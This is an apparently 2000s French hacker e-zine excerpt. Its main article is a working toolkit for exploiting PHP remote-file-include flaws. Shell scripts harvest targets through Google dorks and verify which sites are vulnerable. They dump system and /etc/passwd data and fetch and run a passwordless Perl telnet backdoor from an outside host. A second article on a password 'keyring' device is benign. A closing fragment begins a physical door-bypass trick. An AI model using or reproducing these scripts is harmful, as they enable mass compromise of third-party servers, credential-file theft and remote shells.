\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: googleligeli googeligeli googeligeligeligeli              ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[     loytie   ]=\:\ _//     
                                                  \__\________________________/__/ 

Exploitation avec google par script


L'idΘe de cette technique consiste α utiliser une recherche google  avec  des  critΦres  bien 
dΘfinis pour obtenir une liste de sites vulnΘrables α une faille. Ce procΘdΘ ayant  dΘjα  ΘtΘ 
utilisΘ par diffΘrents vers dont celui exploitant une faille phpbb rΘcente, effaτant  le site 
et se propageant en effectuant une nouvelle recherche par google de site vulnΘrable α la mΩme 
faille.

Le but de ce texte n'est pas de montrer une des derniΦres failles α la mode mais explique une 
maniΦre simple pour construire des scripts afin d'exploiter rapidement une faille de type Web 
et d'obtenir une liste de machine vulnΘrable.  La  suite  consistant  α  utilisΘ  les  droits 
obtenus par l'exploitation pour faire se que bon vous semble et dans le meilleur  des cas, un 
shell distant (le plus souvent sous l'id nobody).

L'idΘe  vient du livre "Google Hacking for Penetration Testers" par Syngress, qui en prΘsente 
les bases. 

L'exemple  qui  suit  prΘsente la faτon d'obtenir par google, une liste de sites susceptibles 
d'Ωtre  vulnΘrables  α  la faille php include. Cette vielle faille est simple α comprendre et 
est  toujours  d'actualitΘ quand toutes les conditions sont rΘunies. Suite α cette recherche, 
la seconde  Θtape  consiste  α vΘrifier que la machine est bien vulnΘrable. Et pour finir, la 
derniΦre Θtape permet d'exploiter la faille et obtenir un shell distant.

Les diffΘrents scripts sont Θcrit en Shell, utilise le navigateur lynx, le tΘlΘchargeur wget, 
les commandes de formatage awk et sed ainsi que les commandes unix de base et  les  principes 
de  programmation  shell.  Les  scripts  ne  sont pas forcement optimal, le but de l'exercice 
servant d'exemple.

Tous les codes sont disponibles sur: http://membres.lycos.fr/loytietoo/




La faille php include


La  faille  php  include  vient  d'une  erreur  de programmation d'une page PHP, utilisant la 
fonction  include  pour  intΘgrer au code une autre page du site. Dans notre cas, la fonction 
include utilise un argument passΘ par l'url pour connaεtre la page α inclure. 

exemple : http://www.exemple.xom?page=liens.php


En modifiant cet argument, il est possible d'inclure une autre page ou un fichier distant  ou 
non.

exemple 1 : http://www.exemple.xom?page=../../etc/passwd
exemple 2 : http://www.exemple.xom?page=http://www.google.com
exemple 3 : http://www.exemple.xom?page=http://www.monsite.com/code.txt

Dans cet exemple, on s'intΘresse α l'exemple 3.

Sans rentrer dans les dΘtails, il faut que toutes les conditions nΘcessaires soit rΘunis pour 
que cela fonctionne, cad que toutes les configs soient mauvaises : programmation  php, config 
php, config apache, config systΦme.

Pour plus d'info sur la faille include : google.

L'exemple 3 permet d'inclure le fichier distant code .txt contenant du code php. Ce code  est 
insΘrΘ par include α celui du site www.exemple.com et exΘcutΘ par  php.  Le  format  txt  est 
justifiΘ par le fait qu'il ne sera pas interprΘtΘ par le site distant www.monsite.com (si php 
interprΘtΘ).

exemple de code.txt :

<?
system("uname -a > /tmp/.null");

$lines=file("/tmp/.null");

foreach ($lines as $line) {
  echo $line . "&lt;br>\n";
}
?>


PHP exΘcute la commande uname -a sur le systΦme, copy la rΘponse dans /tmp/.null. Ensuite  il 
ouvre le fichier /tmp/.null et ajoute chaque ligne du fichier α la page html qu'il  gΘnΦre en 
y ajoutant un saut de ligne &lt;BR>.

La  commande  est  simple,  il  est  possible dΘs a prΘsent d'ouvrir un shell en modifiant la 
commande,  soit  en  tΘlΘchargeant  un  script  shell  distant  par  la commande wget ou bien 
directement par nc.




La recherche google

Rechercher une liste de site susceptible d'Ωtre vulnΘrable α cette faille consiste α utiliser 
l'argument  "inurl"  de  google  en indiquant la variable d'inclusion du site www.exemple.com 
ainsi que le nom de la page incluse.


exemples :
inurl:?page=liens.php
inurl:?p=acceuil.php3
inurl:?include=start.html




Script de scan google

Le  but du script est de vΘrifier que les rΘponses que renvois google respectent les critΦres 
donnΘs,  cad  que l'url  est au bon format. Google permet d'afficher que 100  rΘponses  α  la 
fois, le script va  automatiser le scan de toutes les url page par page. Pour  finir,  toutes 
les urls rΘpondant  au format sont enregistrΘ dans un fichier.

Toutes les recherches sur google sont faites par lynx et enregistrΘ par l'argument dump.


#!/bin/sh

# vΘrifier les arguments
if [ $# -ne 2 ]; then
        echo "Include scan v0.3"
        echo
        echo "Usage: scan.sh &lt;variable> &lt;search>"
        echo
        echo "example : http://www.example.com?page=index.php"
        echo "&lt;variable> = page"
        echo "&lt;search>   = index.php"
        echo
        exit 0
fi

# copier les arguments
VAR=$1
SEARCH=$2;
echo "search -> $VAR=$SEARCH"

# initialiser la recherche, 100 rΘponses α la fois (GNUM) α partir de 0 (GSTART)
GNUM=100
GSTART=0
rm -f list.txt .search.html

# rechercher le nombre de rΘponse total de google (COUNT)
# info : le nombre se trouve sur la ligne contenant about
set -- `lynx -dump "http://www.google.com/search?q=inurl%3A%3F$VAR=$SEARCH&num=1" | \ 
awk '/about/ { printf("%s", $8) }' |  sed -e 's/,//g'`

COUNT=$1
echo "count -> $COUNT"
echo

# tant que rΘponse total non ateint 
while [ "$GSTART" -le "$COUNT" ] ; do

        echo "list -> $GSTART of $COUNT"

        # enregistrer la page de recherche google dans .search.html
        lynx -dump "http://www.google.com/search?q=inurl%3A%3F$VAR=$SEARCH&num=$GNUM&start=$GSTART" > .search.html


        # vΘrifier chaque url de la reherche
	# enregistrer si respecte format
        sed -n "s/\. http:\/\/.*"$VAR"="$SEARCH"/& /p" .search.html | awk '{print $2}' >> list.txt

        # incrementer la recherche
        let GSTART=$GSTART+$GNUM;

done

# fin
rm .search.html
echo
echo "output list -> list.txt"




Script de vΘrification des sites vulnΘrables

Maintenant que l'on possΦde la liste des sites rΘfΘrencΘs par google  et  successible  d'Ωtre 
exploitable par la faille include, le  script  suivant  va  tester  chaque  url  en  essayant 
d'inclure le fichier code.txt.

Le fichier code.txt se contente d'afficher le mot "machtard" sur la page retournΘe. Le script 
vΘrifie  si  la  page  contient  ce  mot  et en dΘduit dans le cas positif que  le  site  est 
vulnΘrable. Au prΘalable, il faut crΘer le fichier code.txt sur un autre site.

code.txt :

<?
system("echo machtard > /tmp/.null2");

$lines=file("/tmp/.null2");

foreach ($lines as $line) {
  $line = str_replace("\$", "", $line);
  $line = str_replace("\<\?", "", $line);
  echo $line . "&lt;br>\n";
}
?>


script :

#!/bin/sh

# vΘrifier les arguments
if [ $# -ne 2 ]; then
        echo "Include scan v0.3"
        echo
        echo "Usage: test.sh &lt;variable> &lt;search>"
        echo
        echo "example : http://www.example.com?page=index.php"
        echo "&lt;variable> = page"
        echo "&lt;search>   = index.php"
        echo
        exit 0
fi

# cpier les arguments
VAR=$1
SEARCH=$2
echo "search -> $VAR=$SEARCH"
echo

# initialiser le scan
VALUE="http:\/\/membres.lycos.fr\/loytietoo\/code.txt"
rm -f vulnerable.txt

# pour chaque url du fichier
cat list.txt | while read line ; do

        # modifier l'url en ajoutant code.txt
        set -- `echo $line | sed -e "s/"$VAR"="$SEARCH"/"$VAR"="$VALUE"/g";`
        SITE=$1

        # demander la page
        lynx -dump $SITE > .site.html

	  # rechercher machtard dans la page
        set -- `cat .site.html | grep machtard | grep -v echo | awk '/machtard/ { printf("OK\n") }'`

        # si vulnΘrable, enregister l'url
        if [ "$1" = "OK" ]; then
                echo "[+] $line"
                echo $line >> vulnerable.txt
        else
                echo "[-] $line"
        fi

done

# fin
rm -f .site.html




Script de demande d'information


Maintenant  que  l'on  possΦde  une  liste  de  site  vulnΘrable, il est possible dÆexploiter 
directement les cibles en rΘcupΘrant des informations complΘmentaires grΓce α  des  commandes 
unix exΘcutΘes depuis le code PHP. 

commandes :
uname -a
uptime
hostname
pwd
id
echo $PATH
cat /etc/passwd
ifconfig
cat /etc/resolv.conf
netstat -l
netstat -r
ps -auxf
lspci
lsmod
env

Pour chaque commande, on insΦre le rΘsultat dans un fichier, que l'on  affiche  sur  la  page 
rΘsultante de la mΩme faτon que le script prΘcΘdent. De plus  on  inclue  au  code  html, une 
balise spΘcial afin de la reconnaεtre les informations qui nous intΘressent dans le code html 
complet retournΘ. Les informations sont ajoutΘes dans un fichier  dΘdiΘ  pour  en  garder une 
trace. Le fichier est copier dans un repertoire "hosts",  il faut le crΘer au prΘalable.


code2.txt : 
&lt;loytie>
<?

system("echo > /tmp/.null2");

system("echo; uname -a >> /tmp/.null2");
system("echo; uptime >> /tmp/.null2");
system("echo; hostname >> /tmp/.null2");
system("echo; pwd >> /tmp/.null2");
system("echo; id >> /tmp/.null2");
system("echo; echo \$PATH >> /tmp/.null2");
system("echo; cat /etc/passwd | grep sh >> /tmp/.null2");
system("echo; ifconfig >> /tmp/.null2");
system("echo; cat /etc/resolv.conf >> /tmp/.null2");
system("echo; netstat -l >> /tmp/.null2");
system("echo; netstat -r >> /tmp/.null2");
system("echo; ps -auxf >> /tmp/.null2");
system("echo; lspci >> /tmp/.null2");
system("echo; lsmod >> /tmp/.null2");
system("echo; env >> /tmp/.null2");

$lines=file("/tmp/.null2");

foreach ($lines as $line) {
  $line = str_replace("\$", "", $line);
  $line = str_replace("\<\?", "", $line);
  echo $line;
}
?>
&lt;/loytie>


script :

#!/bin/sh

# vΘrifier les arguments
if [ $# -ne 2 ]; then
        echo "Include scan v0.3"
        echo
        echo "Usage: exploit.sh &lt;variable> &lt;search>"
        echo
        echo "example : http://www.example.com?page=index.php"
        echo "&lt;variable> = page"
        echo "&lt;search>   = index.php"
        echo
        exit 0
fi

# enregistrer les arguments
VAR=$1
SEARCH=$2;
echo "search -> $VAR=$SEARCH"
echo

# initialiser le script
VALUE="http:\/\/membres.lycos.fr\/loytietoo\/code2.txt"

# pour chaque url 
cat vulnerable.txt | while read line ; do

        # recupΘrer le nom de domaine
        set -- `echo $line | awk -F "/" '{  print $3 }';`
        HOSTNAME=$1

        # modifier l'url en ajoutant code.txt
        set -- `echo $line | sed -e "s/"$VAR"="$SEARCH"/"$VAR"="$VALUE"/g";`
        SITE=$1

        # rΘcupΘrer la page
        wget $SITE -O .site.html 2&> /dev/null

        # init
        find=0

        # scanner la page 
        cat .site.html | while read line2 ; do

		# si pas encore d'information
                # vΘrifier si la ligne contient la balise de dΘpart
                if [ $find = "0" ]; then

                        set -- `echo $line2 | awk '/&lt;loytie>/ { printf("OK\n") }'`
			
			# si balise alors dΘbut d'information
                        if [ "$1" = "OK" ]; then
                                find=1
                                echo $line > .info
                                echo >> .info
                                echo hostname "-> $HOSTNAME"
                        fi

                # si des informations
                # vefifier si balise de fin
		# sinon, enregistrer les informations
                else
                       set -- `echo $line2 | awk '/<\/loytie>/ { printf("OK\n") }'`

                        if [ "$1" = "OK" ]; then
                                find=0
                        fi

                        if [ "$find" = "1" ]; then
                                echo $line2 >> .info
                        fi
                fi

        done

        # enregistrer les informations
        cat .info >> hosts/$HOSTNAME

        # fin
        rm -f .site.html .info
done




Script pour obtenir un shell

Maintenant que nous disposons d'informations sur les cibles, il est possible de les  utiliser 
pour compromettre les  systΦmes  avec  des  attaques  complΘmentaires...  Cependant,  il  est 
intΘressant de disposer d'un shell plut⌠t que d'utiliser la mΘthode script par page web. 

Un  exemple  simple  consiste  α  faire tΘlΘcharger par la cible un programme shell  distant, 
l'exΘcuter  et  pour  finalement  se  connecter dessus. J'utilise personnellement  le  script 
suivant : http://membres.lycos.fr/loytietoo/telnet.pl. Le script exΘcute un shell sur le port 
4123 sans mot de passe, il suffit de se connecter dessus en telnet.

telnet www.exemeple.com 4123

code3.txt :

<?

system("mkdir /tmp/.kernel");
system("wget http://membres.lycos.fr/loytietoo/telnet.pl -P /tmp/.kernel/");
system("/usr/bin/perl /tmp/.kernel/telnet.pl");

?>


script :
#!/bin/sh

# vΘrifier les arguments
if [ $# -ne 3 ]; then
        echo "Include scan v0.3"
        echo
        echo "Usage: telnet.sh &lt;variable> &lt;search> &lt;host_file_info>"
        echo
        echo "example : www.example.com?page=index.php"
        echo "&lt;variable> = page"
        echo "&lt;search>   = index.php"
        echo "&lt;host_file_info> = hosts/www.example.com"
        echo
        exit 0
fi

# copier les arguiments
VAR=$1
SEARCH=$2;
FILE=$3
echo

# initialiser
VALUE="http:\/\/membres.lycos.fr\/loytietoo\/code3.txt"

# lire la premiere ligne du fichier d'information
read line < $FILE

# recuperer le domaine
set -- `echo $line | awk -F "/" '{  print $3 }';`
HOSTNAME=$1
echo $HOSTNAME

# modifier l'url
set -- `echo $line | sed -e "s/"$VAR"="$SEARCH"/"$VAR"="$VALUE"/g";`
SITE=$1

# recuperer la page
wget $SITE -T 15 -O .site.html 2&> /dev/null
rm -f .site.html

# telnet
telnet $HOSTNAME 4123




Conclusion

En espΘrant que cet exemple soit comprΘhensible et intΘressant.

Tous les codes sont disponibles sur: http://membres.lycos.fr/loytietoo/


Cet exemple n'expose pas toutes les  conditions  nΘcessaires  pour  que  cela  fonctionne. En 
effet, il serait judicieux de rajouter des conditions aux  scripts  afin  de s'adapter α tous 
types d'architectures Unix. 

exemple 1 : le rep /tmp est il ecrivable et executable ? dans le cas contraire 
les scripts ne fonctionne pas
exemple 2 : l'ip est tel derriere un NAT ? dans ce cas il faut faire un reverse 
telnet 
...


Je suis persuadΘ que la base google est une bonne approche α la recherche de  vulnΘrabilitΘs. 
Le site http://johnny.ihackstuff.com/ contient une base de  donnΘe  trΦs intΘressante sur les 
recherches d'informations sur Google. 

L'exemple montre aussi la puissance du shell  unix  pour  l'automatisation  de  processus. De 
toute faτon, personne ne fait de hack sous windows (troll mdr).

Je suis ouvert α toutes suggestions ou corrections. 





  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |                                                              \\_  \_ \   \\_ 1  + 
 || |                http://Www.Pyrofreak.Org                      \_ \   \\_  \_ \ 1   
 ||'|                                                                \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Membre honnoraire du webring Hack.fr                                  ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[23]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[  un affaire de password       ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: that's it that's all pas de 2eme couche                   ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[  Lastcall_    =\:\ _//     
                                                  \__\________________________/__/ 




J'ai eu une idΘe : je rΘinvente le porte clefs
  aka J'me rappelle quand Wyze perdait ses clefs dans le zine



J'ai 2000 passwords

Faτons nouvelles de gΘrer τa :
- biomΘtrie = dla marde
- une carte d'accΦs universelle? universel dla marde
- un ti papier avec toute mes pass dessus? si j'le perds chu ownΦde facile
- un set de clefs...

Eureka.

Ce qu'il faut, c'est un set de clefs...
╟a  peut  Ωtre juste  un  petit device,  si  tu te  le  fais voler c'est bad Θvidemment, sauf 
que, tout comme un  set de clefs,  faut  que  la  personne  sache  qu'elle  porte  τa  ouvre. 
Finalement, tu fini par avoir tellement de clefs,  que  de perdre un set de clef  τa  devient 
un security risk moyennement  grand (entk  pas  plus grand que  de perdre tes clefs  en plein 
centre ville),  puisque t'es difficile α cibler.

Donc,
le  set  de clef  devrait  contenir un  moyen  d'accΦs α  toute  nos accounts.  Θvidemment la 
clef peut Ωtre fucking  complexe, vu qu'on a juste α  retenir  de  quoi  elle  a  l'air  pour 
l'associer α un account.

Donc, d'un point de vue interface, on pourrait par exemple associer une  image α un account.. 
ou encore un  mot ou un texte. (tout comme avec un vrai set  de  clefs  on  se rappelle de la 
marque pis  de l'allure de la clef, α la limite  un  print  out  du  hash  md5  dla  key   on  
finirait par reconnaεtre (sauf  si t'as 200  clefs  c  plus compliquΘ, mais aller  demander α 
vos concierge ski font..).  Fak  t'as juste α choisir quel clef utiliser dans ton porte clef, 
pis tu peux avoir accΦs α ton account.

Pour l'utilisation, faudrait  que τa soit  de quoi de physique, ou si c wifi d'un range <1cm. 
Genre tu choisi quel clef prendre, tu plugs la bidule dans le clavier, et t'es authentifiΘ.

Ce que le bidule va  storer : simplement le mot  de passe (ou une key  privΘe)  ainsi   qu'un 
moyen de rappeler l'utilisateur o∙ la clef sert.

On tombe donc avec de  quoi qui a un niveau  de sΘcuritΘ comparable α un vrai set de clef. Si  
vous perdez votre set,  n'importe qui peut faire  des doubles  (bads)  ou  les utiliser.  Y'a 
aussi toutes les  autres choses que vous  pouviez  penser, si genre  on dΘcrisse la  serrure, 
si finalement la porte est rester ouverte, etc etc, mais combien de vous autres se sont faite 
voler leurs  chars paske y'avait laisser les  clefs dedans  le moteur  en marche  dehors dans 
un cartier miteux de MontrΘal la nuit quand y'a du brouillard? Si c'est votre cas nyways vous 
Ωtes un peu cave de faire τa et vous l'avez mΘritΘ. haha

Mais bon, y'a pire comme consΘquence que des vrai clefs, la clef vu quelle  est logique, peut  
Ωtre interceptΘe.  Soit lors  du chargement  vers le bidule, ou soit lors de l'utilisation.

Solution?
Upload  vers  le  bidule:  Le   bidule  accepte seulement les clefs  encryptΘes avec sa  clef  
publique, fak  y'a  juste le  bidule  lui-mΩme qui  peut  dΘcoder le  rΘsultat  du transfert. 
Tlm connais la clef publique de ton bidule (on s'entend  qu'un  bidule  =  un  diffΘrent  par 
personne).  Bon la y reste encore un trou,  du  genre,  tu peux crΘer une fausse clef,  et la 
pitcher au bidule, et le  gars va  penser  que  c  la  bonne mais y  se fait fourrer. Donc la 
solution,  y'a  juste  un  sysadmin  qui peut donner des "clefs"... (le risque est encore la, 
mais  pensez  z'y  un peu... entre  le propriΘtaire de votre  block appart qui vous  donne la
clef, ou  la porte  qui vous  chie une  clef dains  mains, c'est  quoi le plus sΘcure? hehe)

Download du bidule (utilisation de la clef finalement): la Θvidemment on  peut intercepter la  
clef.. solution?  (la chu  moins sure)  Signer la fucking clef  quand  on  l'envoie.  Donc en 
gros, la porte (aka le server) s'assure que la clef  provient  vraiment  du  bon  bidule. Cte 
boute la  y'a moyen de le  travailler un  peu...  mais faut surtout pas penser qui faut faire 
pareil comme le upload. 

Par  exemple,  on  pourrait  un  lien  cryptΘ  entre  le bidule pis le  serveur, pour ensuite 
Θchanger la clef (α la SSH).

Mais faut pas oublier  une chose, c'est que  finalement, toute ce que  je veux que ce  bidule 
lα  fasse, c'est  que enfin  j'aille pu  56000 mots de passes α retenir.. donc si τa sΘcuritΘ  
est >= α la sΘcuritΘ  de taper un mot de  passe  sur  un clavier, j'aurai rΘussi. De plus, si 
τa sΘcuritΘ est proche d'un set de clef, j'aurai de quoi d'acceptable dans un monde rΘel.

Et finalement, pour les paranos, ou  les personnes qui ont  des clefs  vraiment  importantes, 
on  pourrait  utiliser  toute les techniques existantes pour  monter  de  quelques  crans  la 
sΘcuritΘ.  Par exemple, l'accΦs au bidule  demanderait de rentrer un mot  de passe (whatever,  
on peut mΩme  utiliser la biomΘtrie  ici)  pour  utiliser  les  clefs..  donc, si on perd  le 
bidule good luck.  La faudrait  juste  qu'on aie  QU'UN SEUL BIDULE  pour retenir QU'UN  SEUL 
MOT DE  PASSE. Et  c'est  la  que  j'aime  la  biomΘtrie,  mettons que le bidule reconnaεt ma  
rΘtine, j'aurais juste a avoir l'oeil pas  loin pour le dΘbarrer.. pis si j'le perds, ben chu 
juste vraiment dans  marde si en mΩme temps  je perds mon £il (et  qui  reste accrocher aprΦs 
le bidule)...

Mais α la limite,  dans le cas de  perte ou de vol, on a juste α changer les serrures. That's 
all.

Y'a aussi d'autres techniques qu'on  pourrait utiliser, mais je crois  que y'a une  limite  a 
tout.

Y'a aussi des choses qu'on peut pas  faire, car le modΦle que je prΘsente  est  sΘcure,  mais  
pas trop  (ce qui  est α  mon avis  une BONNE sΘcuritΘ, car trop sΘcure τa devient  useless). 
Exemple,  on pourrait  changer de  mot de  passe  souvent?  Mais  genre,  changer  vous   vos  
clefs et  serrures de maison souvent vous? Si vous vous faite voler ok, j'avoue, si vous avez 
des doutes, si  votre ex  a  encore la  clef, ok.  Mais en  temps normal  non. C'est  pour τa  
que la restriction que "y'a juste  l'admin qui peut donner une clef" est bonne, car oui c'est 
compliquΘ α faire, mais c'est ce qui procure justement une  sΘcuritΘ un peu  plus grande,  du 
genre,  faut absolument  owner le  sysadmin pour mΩme pouvoir AVOIR  la clef..  pis entre  un 
sysadmin  parano qui dors pratiquement jamais (ou parano alcoolique) pis monsieur madame tlm, 
les chances de se faire intercepter sont moins grandes... 

Ce qui pourrait  Ωtre fait, c'est  un systΦme comme  sur  les  cartes  d'accΦs  α  puce,  qui 
change avec  le temps, mais dans  ce cas la, faudrait  que le bidule pis  la  porte s'arrange  
avec τa. MAIS, pensez  z'y, on veut pas  remplacer une clef physique,  on veut  remplacer une  
clef logique  (soit un  mot de passe).  Donc,   ultimement, la  clef se  promΦne que  sur des  
liens logique,  donc de  rajouter  une  sΘcuritΘ,  qui  est uniquement  checkable  au  niveau  
physique, est  plut⌠t useless..  donc si  on voudrait  de quoi  qui change  de phase  dans le
temps, faudrait que le bidule soit syncro avec tous les serveurs, et τa τa  va  prendre   des  
annΘes lumiΦres    avant  que    τa  arrive,  parce  que   aprΦs  tout  les  syadmins paranos  
alcooliques sont  p-e fiable,  mais sont  vedge pour changer leurs systΦmes α ce point la.


The future is now.
C'est sur que perso je vois τa comme une bague magique, une clef, voir mΩme un  implant  dans 
le     corps,      mais    tout    les     concepts    la   sont     possible     maintenant.
http://passwordsafe.sourceforge.net/ est un bon exemple.  Cependant, τa sauve dans un fichier 
blowfishΘ pis τa fait juste  copier/coller α partir du clipboard dans Windoze. Ce  qu'on peut 
faire,  MAINTENANT, c'est τa : avoir un PDA, un tΘlΘphone cellulaire qui sert de trousseau de 
clef. On store les passwords dedans.  Une solution poche (ou de poche haha) serait de prendre 
le PDA/cellphone  pour  se rappeler du password (un peut comme on fait avec un post it), mais 
avec  un module wifi genre bluetooth mais une version trΦs poche qui marche juste  si  tu  es 
littΘralement collΘ sur le pc (PAS du fucking 802.11, on veut de quoi  avec  un range MAXIMUM 
oublier pas, ou sinon, faire un packet driver qui drop  toute les trames 802.11 qui sont plus 
longue que le temps que τa prends a l'onde  de  faire  plus  que 20 cm..  good luck τa voyage 
vite  une onde), pis la, avec  une  application  installer  sur  le   PC  et  sur le  PDA, on 
pourrait juste  choisir le mot de passe, pis l'envoyer.  Pensez z'y, τa pourrait mΩme marcher  
direct avec n'importe quel site web,  τa copierais  directement  dans  la  case   de  mot  de  
passe!  Not   bad,  mais malheureusement c long  gosser dans un  pda/cellphone, faudrait donc  
avoir un piton  shortcut  de programmer,  et  on pourrait avoir le cas d'utilisation suivant:

J'arrive devant un ordi,
je sors mon PDA de mes poches, je pΦse sur le piton de mon PDA (5 secs).
Le PDA se plug crypter avec l'ordi,
J'ai une confirmation sur mon PDA de l'ordi et vice versa (2 + 2 secs).

La on pourrait faire de quoi de cool et pratique, genre l'ordi propose au  PDA qui veut avoir 
le mot de  passe pour www.duporn.com/members/. Mais si on  fait  τa,  on enlΦve le "besoin de 
reconnaεtre  ou va la clef pour sen servir". Mais le trade off peut Ωtre intΘressent avec les 
passwords moins  important (genre l'accΦs au site web de cul, versus un account root).

Donc,  si  on fait  l'affaire cool,  τa prendrait  mΩme pas 1 secondes, et le password serait 
envoyΘ vers l'ordi. et tu click login, fini napu. A  la  limite  τa  pourrait mΩme retenir le 
username itoo! on sauve du temps la!

Sinon, faudrait :
- checker la liste des mots de passe (2 * n = 30 secs si j'ai 15 passwords)
- choisir le mot de passe pis peser sur le piton send (5 + 2 = 7 secondes).

Mais des fois τa vaut la peine, car pensez-zy,
l'account root vous vous logger une fois par semaine et
l'account du site de cul, well plusieurs voir par jour =)

Ah pis, dans mon cas prΘsentement par exemple, la  sΘcuritΘ  est  moins  forte  que  dans  le  
modΦle,  parce  que on  change  RIEN  au  systΦme d'authentification  prΘsent, donc n'importe 
qui peut loader une clef dans le bidule (le PDA), sauf  que, quand mΩme, on a juste a se dire 
que le seul moyen de rentrer le password dans le PDA c de l'Θcrire soit mΩme...

Et pensez z'y, avec τa, votre mot de passe sur genre un phpBB pourrait Ωtre
KjG56ga$ads$12fJ45gFjD3F4?ags%b
et prendre AUTANT de temps α rentrer que 123456.. pratique.

Bon voila,
c'est mon proof of concept, aprΦs avoir rΘflΘchi pendant genre quelque mois au sujet que "les 
fuckings passwords ca  sert a rien chu tannΘ den  avoir 85000", j'Θtais sur mon sofa pis j'ai 
pensΘ α un porte clef...

Pour ceux qui  ont eux le  courage de lire mes dΘblatΘrations au complet, et bien  bravo mais  
je vous encourage α  y songer encore plus pis α dΘtruire "mon  proof  of  concept". C'est  de 
cette  faτon que  la mentalitΘ  "hacking" sert α quelque chose.. et peut-Ωtre qu'un jour,   α 
force de dΘtruire les failles  des idΘes, on aura des idΘes presque parfaites.



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |Vous voulez vanter un produit ou un service qui vaut rien?    \\_  \_ \   \\_ 1  + 
 || |RΘservez dΦs maintenant vos espaces publicitaire pour le      \_ \   \\_  \_ \ 1   
 ||'|prochain e-zine : wyzeman@mindkind.org                          \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Bon tout le monde a compris la ?                                      ]=\:\  |
  \__\__________________________________________________________________________________/ 


 

Je n'ai pas l'intention de faire un grand texte style tutorial  pour  mon  ratator.  Je  vais 
Greetz  to :  M. Steve  Berberi,  sergent  spΘcialiste,  S√retΘ  du QuΘbec et sont Θquipe qui 
overall doivent etre payer beaucoup plus chere a nous lire que ce que ca nous  donne  decrire 
tout ca.  



si  par  malheure  vous  vous  etiez  embarer en dehors de votre bureau en allant imprimer ce 
ezine, voici un petit truc qu'un de nos fan nous a envoyez qui pourrais ptete vous aidez.


The Paper-Key.
Ak: La paresse des sorteurs.

Par Imini.


Voici une faτon alternative dÆouvrir, sans aucune clΘ, toutes sortes de portes sΘcurisΘes par 
des systΦmes de cartes magnΘtiques, de NIP, ou autre.

MatΘriel nΘcessaireá:
-	Une feuille 8╜/11

Conditions requises:
-	Une porte ayant des fentes autour dÆelle
-	Un dΘtecteur de mouvement (de lÆautre cotΘ de la porte)


Vous  allez  voir,  nul besoin d'Ωtre une grande lumiΦre pour comprendre le fonctionnement de 
cet exploit.

Voici une entreprise typiquement vulnΘrable:

